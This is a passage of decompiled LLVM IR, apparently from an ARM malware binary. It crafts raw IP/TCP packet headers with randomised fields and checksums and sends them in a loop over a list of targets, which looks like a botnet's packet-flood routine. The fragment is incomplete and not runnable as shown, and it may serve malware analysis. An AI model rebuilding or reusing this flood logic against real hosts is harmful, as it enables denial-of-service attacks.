  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v6_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* %r4.global-to-local, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* %r4.global-to-local, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* %r4.global-to-local, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* @r0, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* %r4.global-to-local, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = call i32 @rand_str(i32 %v1_accc, i32 %v6_aa14)
  store i32 %v2_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v9_aea8 = icmp eq i32 %v3_aaac, ptrtoint (i16* @global_var_ffff.60 to i32)
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v7_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v7_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v7_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v7_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  store i32 %v3_ae38, i32* %r4.global-to-local, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v4_ae64 = mul i32 %v1_ae5c, 256
  %v4_ae68 = mul i32 %v3_ae38, 16777216
  %v5_ae64 = or i32 %v4_ae64, %v4_ae68
  %v5_ae68 = or i32 %v5_ae64, %v5_ae54
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v9_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

